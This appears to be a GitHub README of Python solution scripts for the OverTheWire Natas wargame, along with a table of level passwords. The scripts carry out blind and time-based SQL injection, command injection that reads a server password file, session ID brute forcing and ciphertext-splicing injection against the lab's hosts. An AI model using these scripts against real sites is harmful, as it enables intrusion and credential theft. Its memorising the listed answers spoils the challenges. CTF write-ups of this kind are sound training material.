# Natas Password Cracker Solutions

A collection of solutions and passwords for various Natas wargame levels from OverTheWire. This repository contains Python scripts to solve different levels of the Natas wargame challenges.

## 🔐 Latest Level Passwords

| Level | Password |
|-------|----------|
| Natas 27 | u3RRffXjysjgwFU6b9xa23i6prmUsYne |
| Natas 28 | 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj |
| Natas 29 | 31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns |
| Natas 30 | WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH |
| Natas 31 | m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y |
| Natas 32 | NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B |
| Natas 34 | j4O7Q7Q5er5XFRCepmyXJaWCSIrslCJY |

## 📚 Solutions

### Level 14 → 15
This level involves SQL injection with LIKE operator.

```python
import requests

chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
password = "hPkjKYvi"
url = "http://natas15.natas.labs.overthewire.org/index.php"

basic_user = "natas15"
basic_pass = "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"

while len(password) <= 32:
    for testing in chars:
        data = {"username": f'natas16" AND password LIKE BINARY "{password + testing}%" #'}
        resp = requests.post(url, data=data, auth=(basic_user, basic_pass))
    
        if "This user exists." in resp.text:
            password += testing
            print(f"Current password: {password}")
            break

print(f"Final password: {password}")
```

### Level 15 → 16
Solution involves command injection with grep.

```python
import requests

chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
password = "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"
url = "http://natas16.natas.labs.overthewire.org/"
auth = ("natas16", "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo")

while len(password) < 32:
    for char in chars:
        print(f"Testing character: {char}")
        payload = f"$(grep ^{password}{char} /etc/natas_webpass/natas17)"
        response = requests.get(url, auth=auth, params={"needle": payload, "submit": "Search"})
        
        if "Americanisms" not in response.text:
            password += char
            print(f"Found so far: {password}")
            break

print(f"Password for natas17: {password}")
```

### Level 17 → 18
Time-based SQL injection solution.

```python
import requests

password = "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ"
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
auth = ("natas17", "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC")
url = "http://natas17.natas.labs.overthewire.org/"

while len(password) < 32:
    print(f"Current password: {password}")
    print("Testing: ", end='')
    for char in chars:
        print(char, end="", flush=True)
        data = {'username': f'natas18" and password like binary "{password}{char}%" and sleep(20) -- '}
        
        try:
            response = requests.post(url, data=data, auth=auth, timeout=10)
        except requests.exceptions.ReadTimeout:
            password += char
            print("")
            break
        
print(f"Final password: {password}")
```

### Level 18 → 19
Session ID bruteforce attack.

```python
import requests

auth = ("natas18", "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ")
url = "http://natas18.natas.labs.overthewire.org/index.php"
password = "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr"

for i in range(1, 640):
    cookies = {"PHPSESSID": str(i)}
    response = requests.get(url, auth=auth, cookies=cookies)
    print(f"Trying session ID: {i}")
    
    if "regular user" not in response.text:
        print("Admin session found!")
        print(response.text)
        break
```

### Level 19 → 20
Advanced session ID manipulation with hex encoding.

```python
import requests

def hex2ascii(s):
    ret = ""
    for c in s:
        coded = hex(ord(c))[2:]
        if len(coded) == 1:
            coded = '0' + coded
        ret += coded
    return ret

auth = ("natas19", "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr")
url = "http://natas19.natas.labs.overthewire.org/index.php"
password = "p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw"

for i in range(1, 640):
    session_id = hex2ascii(f"{i}-admin")
    cookies = {"PHPSESSID": session_id}
    res = requests.get(url, auth=auth, cookies=cookies)
    
    print(f"Trying ID: {i} ({session_id})")
    
    if "regular user" not in res.text:
        print("Success! Found admin session")
        print(res.text)
        break
```

### Level 21 → 22
Session manipulation across subdomains.

```python
import requests

target = 'http://natas21.natas.labs.overthewire.org'
auth = ('natas21', 'BPhv63cKE1lkQl04cE5CuFTzXe15NfiH')
exp_tar = 'http://natas21-experimenter.natas.labs.overthewire.org/?debug=true&submit=1&admin=1'

# Get admin session from experimenter
session = requests.Session()
response = session.post(exp_tar, auth=auth)
admin_session = session.cookies['PHPSESSID']
print("Got admin session cookie")

# Use admin session on main site
response = requests.get(target, auth=auth, cookies={"PHPSESSID": admin_session})
print("Response from main site:")
print(response.text)
```

### Level 27 → 28
Advanced SQL injection with encryption.

```python
import requests
import urllib
import base64

url = "http://natas28.natas.labs.overthewire.org"
s = requests.Session()
s.auth = ('natas28', '1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj')

# Generate baseline for header/footer
data = {'query': 10 * ' '}
r = s.post(url, data=data)
baseline = urllib.parse.unquote(r.url.split('=')[1])
baseline = base64.b64decode(baseline.encode('utf-8'))
header = baseline[:48]
footer = baseline[48:]

# Generate ciphertext query
sqli = 9 * " " + "' UNION ALL SELECT password FROM users;#"
data = {'query': sqli}
r = s.post(url, data=data)
exploit = urllib.parse.unquote(r.url.split('=')[1])
exploit = base64.b64decode(exploit.encode('utf-8'))

# Calculate payload size
nblocks = len(sqli) - 10
while nblocks % 16 != 0:
    nblocks += 1 
nblocks = int(nblocks / 16)

# Forge final query
final = header + exploit[48:(48 + 16 * nblocks)] + footer
final_ciphertext = base64.b64encode(final)
search_url = "http://natas28.natas.labs.overthewire.org/search.php"
resp = s.get(search_url, params={"query": final_ciphertext})

print(resp.text)
```

### Level 29 → 30
SQL injection with parameter type manipulation.

```python
import requests

auth = ('natas30', 'WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH')
data = {
    'password': 'ali',
    'username': ["'%' or 1 # ", 2]
}
url = 'http://natas30.natas.labs.overthewire.org'

response = requests.post(url, data=data, auth=auth)
print(response.text)
```

## ⚠️ Disclaimer

These solutions are for educational purposes only. Please ensure you have proper authorization before attempting any security challenges.

## 📝 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## 🤝 Contributing

Contributions, issues, and feature requests are welcome! Feel free to check [issues page](../../issues).

---
Created with ❤️ by [Ali-hey-0](https://github.com/Ali-hey-0)
